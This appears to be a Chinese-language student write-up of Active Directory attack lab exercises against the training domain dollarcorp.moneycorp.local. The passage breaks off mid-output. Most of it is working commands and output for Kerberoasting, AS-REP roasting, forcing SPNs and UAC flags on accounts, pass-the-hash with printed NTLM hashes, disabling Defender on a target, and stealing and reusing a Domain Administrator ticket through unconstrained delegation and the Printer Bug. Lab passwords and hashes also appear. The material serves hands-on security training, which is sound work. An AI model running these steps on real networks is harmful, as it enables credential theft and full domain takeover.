> ● Using the Kerberoast attack, crack password of a SQL server service account.


## 什么是SPN？
> SPN(Service Principal name)服务器主体名称。
> 在使用 Kerberos 身份验证的网络中，必须在内置计算机帐户（如 NetworkService 或 LocalSystem）或用户帐户下为服务器注册 SPN。对于内置帐户，SPN 将自动进行注册。但是，如果在域用户帐户下运行服务，则必须为要使用的帐户手动注册SPN。


查找所有SPN，会有很多返回，但主要查看域管理员开启的服务
```
PS C:\ad> Get-NetUser -spn |select userprincipalname,serviceprincipalname

userprincipalname serviceprincipalname
----------------- --------------------
                  kadmin/changepw
websvc            {SNMP/ufc-adminsrv.dollarcorp.moneycorp.LOCAL, SNMP/ufc-adminsrv}
svcadmin          {MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433, MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local}
```

因为svcadmin是一个域管理员，所以我们可以以它开启的服务请求一个tikcet

```
PS C:\ad> Add-Type -AssemblyName System.IdentityModel
PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local"


Id                   : uuid-3d512be4-7ade-4394-bec6-e844aa7c77fb-1
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/15/2022 6:56:27 AM
ValidTo              : 2/15/2022 3:04:38 PM
ServicePrincipalName : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

现在用klist命令查看我们是否有这个服务的TGS
```
PS C:\ad> klist

Current LogonId is 0:0x3114e90c

Cached Tickets: (11)

<略>
#2>     Client: svcadmin @ DOLLARCORP.MONEYCORP.LOCAL
        Server: MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/14/2022 22:56:27 (local)
        End Time:   2/15/2022 7:04:38 (local)
        Renew Time: 2/21/2022 1:34:38 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
<略>
```

有MSSQLSvc的TGS

用Mimikatz dump出tikets
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::list /export"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::list /export

<略>
[00000002] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/14/2022 10:56:27 PM ; 2/15/2022 7:04:38 AM ; 2/21/2022 1:34:38 AM
   Server Name       : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : svcadmin @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
<略>
```

在当前目录生成了一个TGS文件```2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi```

拷贝到文件夹```kerberoast```，使用```tgsrepcrack.py```破解密码

```
PS C:\ad> cd .\kerberoast\
PS C:\ad\kerberoast> python.exe .\tgsrepcrack.py .\10k-worst-pass.txt .\2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
found password for ticket 0: *ThisisBlasphemyThisisMadness!!  File: .\2-40a10000-svcadmin@MSSQLSvc~dcorp-mgmt.dollarcorp.moneycorp.local-DOLLARCORP.MONEYCORP.LOCAL.kirbi
All tickets cracked!
```

密码是：```*ThisisBlasphemyThisisMadness!!```

得到了svcadmin明文密码，现在可以用下面命令登录到dcorp-mgmt,提权到域管理员。
```
Enter-PSSession –Computername dcorp-mgmt –credential dcorp\svcadmin
```
问题：SPN for which a TGS is requested
答案：MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local

# Learning Objective 15:
>Task
>● Enumerate users that have Kerberos Preauth disabled.
>● Obtain the encrypted part of AS-REP for such an account.
>● Determine if studentx has permission to set User Account Control flags for any user.
>● If yes, disable Kerberos Preauth on such a user and obtain encrypted part of AS-REP.

枚举禁用了Kerberos预认证的用户
这里要注意引用的是dev版本的PowerView

然后遇到一个坑是，突然之间学生机跟域的连接好像断掉了，排查了好久。然后我重启了VM就好了。。。

```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Get-DomainUser -PreauthNotRequired -Verbose
Exception calling "GetNames" with "1" argument(s): "Value cannot be null.
Parameter name: enumType"
At C:\ad\PowerView_dev.ps1:5132 char:9
+         $UACValueNames = [Enum]::GetNames($UACEnum)
+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
    + FullyQualifiedErrorId : ArgumentNullException

New-DynamicParameter : Cannot validate argument on parameter 'ValidateSet'. The argument is null or empty. Provide an
argument that is not null or empty, and then try the command again.
At C:\ad\PowerView_dev.ps1:5136 char:59
+ ... -DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ( ...
+                                                    ~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidData: (:) [New-DynamicParameter], ParameterBindingValidationException
    + FullyQualifiedErrorId : ParameterArgumentValidationError,New-DynamicParameter

VERBOSE: [Get-DomainSearcher] search base:
LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL
VERBOSE: [Get-DomainUser] Searching for user accounts that do not require kerberos preauthenticate
VERBOSE: [Get-DomainUser] filter string:
(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))
The right operand of '-as' must be a type.
At C:\ad\PowerView_dev.ps1:3180 char:17
+ ...             $ObjectProperties[$_] = $Properties[$_][0] -as $SamAccoun ...
+                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : AsOperatorRequiresType

The right operand of '-as' must be a type.
At C:\ad\PowerView_dev.ps1:3187 char:17
+ ...               $ObjectProperties[$_] = $Properties[$_][0] -as $UACEnum
+                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException
    + FullyQualifiedErrorId : AsOperatorRequiresType



logoncount            : 1
badpasswordtime       : 12/31/1600 4:00:00 PM
distinguishedname     : CN=VPN359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
objectclass           : {top, person, organizationalPerson, user}
displayname           : VPN359User
lastlogontimestamp    : 9/12/2021 10:18:51 PM
userprincipalname     : VPN359user
name                  : VPN359User
objectsid             : S-1-5-21-1874506631-3219952063-538504511-45125
samaccountname        : VPN359user
codepage              : 0
accountexpires        : NEVER
countrycode           : 0
whenchanged           : 9/13/2021 5:18:51 AM
instancetype          : 4
usncreated            : 495969
objectguid            : 85dce89b-bacf-4611-80c8-964999151887
sn                    : user
lastlogoff            : 12/31/1600 4:00:00 PM
objectcategory        : CN=Person,CN=Schema,CN=Configuration,DC=moneycorp,DC=local
dscorepropagationdata : {11/25/2020 11:40:34 AM, 1/1/1601 12:00:00 AM}
givenname             : VPN359
lastlogon             : 9/12/2021 10:18:51 PM
badpwdcount           : 0
cn                    : VPN359User
whencreated           : 11/25/2020 11:40:34 AM
primarygroupid        : 513
pwdlastset            : 11/25/2020 3:40:34 AM
usnchanged            : 529513
```

使用ASREPRoast.ps1获取kerb哈希值，这个值可以使用john等破解工具破解
```
PS C:\ad> cd .\ASREPRoast-master\
PS C:\ad\ASREPRoast-master> . .\ASREPRoast.ps1
PS C:\ad\ASREPRoast-master> Get-ASREPHash -UserName VPN359user -Verbose
VERBOSE: [Get-ASREPHash] DC server IP '172.16.2.1' resolved from current domain
VERBOSE: [Get-ASREPHash] Bytes sent to '172.16.2.1': 196
VERBOSE: [Get-ASREPHash] Bytes received from '172.16.2.1': 1498
$krb5asrep$VPN359user@dollarcorp.moneycorp.local:0550211c4e62a02b8a792f801a55d5f5$765361c9f812235d1be0449b49155974feeba51e85f78e471079ec18f5437618ec1fcc5fca4b21a404b9776a31b42bf46781ff7c689de4fcde343e90a1d9441976c16f90695192ef5a683b8de4e907f423e9d898e7776cb4791b756700633f1295b77d89134bbc5c8ae93935801bf900efb554b9
```

tool里面没有JTR，去到kali破解这个哈希



枚举RDPUsers组成员对其中有GenericWrite 或者 GenericAll权限的用户
```
PS C:\ad> . .\PowerView_dev.ps1
PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"}
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a
distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a
distinguishedname with Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a
distinguishedname with Convert-ADName


ObjectDN                : CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1116
IdentityReferenceName   : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : group

ObjectDN                : CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1874506631-3219952063-538504511-1116
IdentityReferenceName   : RDPUsers
IdentityReferenceDomain : dollarcorp.moneycorp.local
IdentityReferenceDN     : CN=RDP Users,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local
IdentityReferenceClass  : group
(略)
```

因为当前账号（student366）在RDPUsers组中，而RDPUsers组对上面这些用户有GenericAll或者GenericWrite的权限，所以可以强制关闭这些用户的预认证
```
PS C:\ad> Set-DomainObject -Identity Control359User -XOR @{useraccountcontrol=4194304} -Verbose
VERBOSE: [Get-DomainSearcher] search base: LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string:
(&(|(|(samAccountName=Control359User)(name=Control359User)(displayname=Control359User))))
VERBOSE: [Set-DomainObject] XORing 'useraccountcontrol' with '4194304' for object 'Control359user'
```

关闭以后获取这个用户的krb5哈希
```
PS C:\ad\ASREPRoast-master> Get-ASREPHash -UserName Control359User -Verbose
VERBOSE: [Get-ASREPHash] DC server IP '172.16.2.1' resolved from current domain
VERBOSE: [Get-ASREPHash] Bytes sent to '172.16.2.1': 200
VERBOSE: [Get-ASREPHash] Bytes received from '172.16.2.1': 1538
$krb5asrep$Control359User@dollarcorp.moneycorp.local:709bbc1014a90187f95a2e6ca2a291e2$142ccda8eee6138cf3633ea1ad552b364227257a0869cbb25a641b5a3fca25737e362de008e6265d2e14a3ea3431d2936b6729aac7efc5d304996763eddbe9a76899e9575a2fdcc8abe2ea89f87589cea1198e2ed7bcdddbfebbfe194
a1f72c43b28f23728454a1000a524f0c988b51aca49201b6c1126e4fcef6b86f430252068b3913ccf8c97575c620d9b8c630fd69efb6eb9eacf0ccd3d5e41b43e40104474148e486eaf446355229f99e5f9c162bd8a1f09794d81c2c1907625d010ce6cc7aeeab559bea9e148a10e50e3eacfc601f8add19315d38933a6384fddd5fa7a3cb92895
15fe08ac1bc9a38ac14a950409eb4e0b8fb01abd336ec60bd9f7ef4f24e38c82096c7dbc
```

问题： UserAccountControl flag set on ControlXuser
答案： 4194304


# Learning Objective 16:

> Task
> ● Determine if studentx has permissions to set UserAccountControl flags for any user.
> ● If yes, force set a SPN on the user and obtain a TGS for the user.


从下面结果可以知道当前账号（student366，是RDPUsers组的成员），对下面显示的账号是有GenericAll权限的
```
PS C:\ad> Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "RDPUsers"} |select ObjectDN,ActiveDirectoryRights
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a distinguishedname with
Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a distinguishedname with
Convert-ADName
WARNING: [Find-InterestingDomainAcl] Unable to convert SID 'S-1-5-21-1874506631-3219952063-538504511-36147' to a distinguishedname with
Convert-ADName

ObjectDN                                                       ActiveDirectoryRights
--------                                                       ---------------------
CN=Control359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control361User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control362User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control363User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control364User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control365User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control366User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control367User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control368User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control369User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Control370User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support359User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support360User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support361User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support362User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support363User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support364User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support365User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support366User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support367User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support368User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support369User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
CN=Support370User,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local            GenericAll
```

选择Support370User用户，查询这个账号是否有SPN

```
PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname


serviceprincipalname
--------------------
```


因为本账号（student366，是RDPUsers组的成员），对这个用户有GenericAll权限，我们可以为其设置一个SPN

```
PS C:\ad> Set-DomainObject -Identity Support370User -Set @{serviceprincipalname='dcorp/whateverX'} -Verbos
VERBOSE: [Get-DomainSearcher] search base: LDAP://DCORP-DC.DOLLARCORP.MONEYCORP.LOCAL/DC=DOLLARCORP,DC=MONEYCORP,DC=LOCAL
VERBOSE: [Get-DomainObject] Get-DomainObject filter string: (&(|(|(samAccountName=Support370User)(name=Support370User)(displayname=Support370User))))
VERBOSE: [Set-DomainObject] Setting 'serviceprincipalname' to 'dcorp/whateverX' for object 'Support370user'
```

现在我们再次获取这个账号的SPN
```
PS C:\ad> Get-DomainUser -Identity Support370User | select serviceprincipalname
serviceprincipalname
--------------------
dcorp/whateverX
```

现在，根据这个SPN，我们可以请求一个可以被破解的ticket
```
Cached Tickets: (0)
PS C:\ad> Add-Type -AssemblyNAme System.IdentityModel
PS C:\ad> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "dcorp/whateverX"


Id                   : uuid-0230be8f-1cbc-4347-ac11-f1ba5519a667-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/15/2022 10:36:31 AM
ValidTo              : 2/15/2022 8:36:31 PM
ServicePrincipalName : dcorp/whateverX
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey
```

使用klist命令列出SPN
```
PS C:\ad> klist

Current LogonId is 0:0x2a582

Cached Tickets: (2)

#0>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e10000 -> forwardable renewable initial pre_authent name_canonicalize
        Start Time: 2/15/2022 2:36:31 (local)
        End Time:   2/15/2022 12:36:31 (local)
        Renew Time: 2/22/2022 2:36:31 (local)
        Session Key Type: AES-256-CTS-HMAC-SHA1-96
        Cache Flags: 0x1 -> PRIMARY
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local

#1>     Client: student366 @ DOLLARCORP.MONEYCORP.LOCAL
        Server: dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
        KerbTicket Encryption Type: RSADSI RC4-HMAC(NT)
        Ticket Flags 0x40a10000 -> forwardable renewable pre_authent name_canonicalize
        Start Time: 2/15/2022 2:36:31 (local)
        End Time:   2/15/2022 12:36:31 (local)
        Renew Time: 2/22/2022 2:36:31 (local)
        Session Key Type: RSADSI RC4-HMAC(NT)
        Cache Flags: 0
        Kdc Called: dcorp-dc.dollarcorp.moneycorp.local
```

看到已经有dcorp/whateverX的SPN

用mimikatz导出
```
PS C:\ad> . .\Invoke-Mimikatz.ps1
PS C:\ad> Invoke-Mimikatz -Command '"kerberos::list /export"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::list /export

[00000000] - 0x00000012 - aes256_hmac
   Start/End/MaxRenew: 2/15/2022 2:36:31 AM ; 2/15/2022 12:36:31 PM ; 2/22/2022 2:36:31 AM
   Server Name       : krbtgt/DOLLARCORP.MONEYCORP.LOCAL @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
   * Saved to file     : 0-40e10000-student366@krbtgt~DOLLARCORP.MONEYCORP.LOCAL-DOLLARCORP.MONEYCORP.LOCAL.kirbi

[00000001] - 0x00000017 - rc4_hmac_nt
   Start/End/MaxRenew: 2/15/2022 2:36:31 AM ; 2/15/2022 12:36:31 PM ; 2/22/2022 2:36:31 AM
   Server Name       : dcorp/whateverX @ DOLLARCORP.MONEYCORP.LOCAL
   Client Name       : student366 @ DOLLARCORP.MONEYCORP.LOCAL
   Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
   * Saved to file     : 1-40a10000-student366@dcorp~whateverX-DOLLARCORP.MONEYCORP.LOCAL.kirbi
```

导出来的tiket可以用tgsrepcrack.py破解

也可以用powerview导出krb5哈希，然后再用john破解
```
PS C:\ad> Get-DomainUser -Identity Support370User | Get-DomainSPNTicket | select -ExpandProperty Hash

$krb5tgs$23$*Support370user$dollarcorp.moneycorp.local$dcorp/whateverX*$CEBC7827456EC573D18BF59B70E86E35$52EB351B79C805C62B0B761E8E6DCD920FEEB836572AD932876A925CB0732521C0B7D912AF9987CC507C921A602F7CC403153B39E0C612ADC9788436E1F9CAEC5AD716E3B920A004D2D23FE2EB1AF3860C4F03
```

问题：Which group has GenericAll rights over SupportXuser
答案：RDPUsers


# Learning Objective 17:
> Task
> •  Find a server in the dcorp domain where Unconstrained Delegation is enabled.
> •  Access that server, wait for a Domain Admin to connect to that server and get Domain Admin privileges.

## 非约束委派

枚举非约束委派计算机（Unconstrained Delegation）
```
PS C:\ad> Get-NetComputer -UnConstrained |select cn
cn
--
DCORP-DC
DCORP-APPSRV
```

枚举到两台计算机启用了无约束委派：dcorp-dc（DC服务器）和dcorp-appsrv


由于使用无约束委派的先决条件是有一个有本地管理权限的用户，
我们需要攻陷DCORP-APPSRV这台机器上一个有本地管理员权限的用户
之前我们分别收集了appadmin, srvadmin 和 websvc的用户名机器NTML
现在分别用这三个账号测试，是否在dcorp-appsrv这台机器上有本地管理员权限
```
appadmin:d549831a955fee51a43c83efb3928fa7
srvadmin:a98e18228819e8eec3dfa33cb68b0728
websvc：cc098f204c5887eaa8253e7c2749156f
```

分别对三个用户执行下面权限，得到一个该用户的新shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

appadmin拥有local admin权限的机器有
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
dcorp-appsrv.dollarcorp.moneycorp.local
```

websvc拥有local admin权限的机器有
```
 PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-std366.dollarcorp.moneycorp.local
```

srvadmin拥有local admin权限的机器有
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Find-LocalAdminAccess
dcorp-adminsrv.dollarcorp.moneycorp.local
dcorp-mgmt.dollarcorp.moneycorp.local
dcorp-std366.dollarcorp.moneycorp.local
```

由枚举结果可知，符合条件的只有appadmin

## 方法一（DA令牌复用）

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

横向到dcorp-appsrv，创建一个文件夹
```
PS C:\ad> Enter-PSSession $sess
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents> mkdir user366
```

用Mimikatz导出所有令牌，看看是否有Administrator的令牌
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"sekurlsa::
tickets /export"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # sekurlsa::tickets /export

<略>

Authentication Id : 0 ; 3929288 (00000000:003bf4c8)
Session           : Network from 0
User Name         : Administrator
Domain            : dcorp
Logon Server      : (null)
Logon Time        : 2/15/2022 6:02:00 AM
SID               : S-1-5-21-1874506631-3219952063-538504511-500

         * Username : Administrator
         * Domain   : DOLLARCORP.MONEYCORP.LOCAL
         * Password : (null)

        Group 0 - Ticket Granting Service

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 2/15/2022 6:02:00 AM ; 2/15/2022 4:02:00 PM ; 2/22/2022 6:02:00 AM
           Service Name (02) : krbtgt ; DOLLARCORP.MONEYCORP.LOCAL ; @ DOLLARCORP.MONEYCORP.LOCAL
           Target Name  (--) : @ DOLLARCORP.MONEYCORP.LOCAL
           Client Name  (01) : Administrator ; @ DOLLARCORP.MONEYCORP.LOCAL
           Flags 60a10000    : name_canonicalize ; pre_authent ; renewable ; forwarded ; forwardable ;
           Session Key       : 0x00000012 - aes256_hmac
             2d67ea81d9628838bac1d03a94ecaa0ac1002bff18529deb112cf2238b7a6270
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
           * Saved to file [0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi !
<略>
```

如果上面不能取得Administrator的令牌，在学生机器执行下面这条触发，然后再用mimikatz导一次
```
PS C:\ad> . .\PowerView.ps1
PS C:\ad> Invoke-UserHunter -ComputerName dcorp-appsrv -Poll 100 -UserName Administrator -Delay 5 -Verbose
```

如果已经可以查看到Administrator令牌，复用Administrator令牌，取得DA权限
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Mimikatz -Command '"kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi"'

  .#####.   mimikatz 2.1.1 (x64) built on Nov 29 2018 12:37:56
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo) ** Kitten Edition **
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(powershell) # kerberos::ptt C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi

* File: 'C:\Users\appadmin\Documents\user366\[0;3bf4c8]-2-0-60a10000-Administrator@krbtgt-DOLLARCORP.MONEYCORP.LOCAL.kirbi': OK
```
执行成功！

测试我们现在是否有administrator权限，指定DC服务器执行whoami和hostname命令
```
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents\user366> Invoke-Command -ScriptBlock{whoami;hostname} -computername dcorp-dc
dcorp\administrator
dcorp-dc
```

证明我们已经取得了DA权限


## 方法二（Printer Bug）

原理：MS-RPRN 有一项功能，允许任何域用户(已验证的用户)强制任何机器(后台运行了打印程序服务)连接到域用户选择的第二台机器，我们可以通过滥用Printer Bug错误来强制dcorp-dc连接到 dcorp-appsrv。

重新起一个appadmin的shell
```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:appadmin /domain:dollarcorp.moneycorp.local /ntlm:d549831a955fee51a43c83efb3928fa7 /run:powershell.exe"'
```

起一个dcorp-appsrv的session
```
$sess = New-PSSession -ComputerName dcorp-appsrv.dollarcorp.moneycorp.local
```

在指定session里载入Mimikatz
```
Invoke-Command -FilePath C:\AD\Invoke-Mimikatz.ps1 -Session $sess
```

指定目标靶机的session，在目标靶机关闭杀软。这里bypass AMSI如果执行不成功，可以直接进去试多几种方法
```
Invoke-command -ScriptBlock{Set-MpPreference -DisableIOAVProtection $true} -Session $sess
```

把Rubeus.exe拷贝到dcorp-appsrv
```
Copy-Item -ToSession $appsrv1 -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
```

进到dcorp-appsrv，运行Rubeus.exe，这个shell不要关闭
```
PS C:\ad> copy-Item -ToSession $sess -Path C:\AD\Rubeus.exe -Destination C:\Users\appadmin\Downloads
PS C:\ad> Enter-PSSession $sess
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Documents> cd ..\Downloads\
[dcorp-appsrv.dollarcorp.moneycorp.local]: PS C:\Users\appadmin\Downloads> .\Rubeus.exe monitor /interval:5 /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: TGT Monitoring
[*] Monitoring every 5 seconds for new TGTs


```



回到学生机，执行下面命令

```
.\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```


然后在dcorp-appsrv的Rubeus.exe里，就看到了DCORP-DC的TGT
```
[*] 2/15/2022 2:50:23 PM UTC - Found new TGT:

  User                  :  DCORP-DC$@DOLLARCORP.MONEYCORP.LOCAL
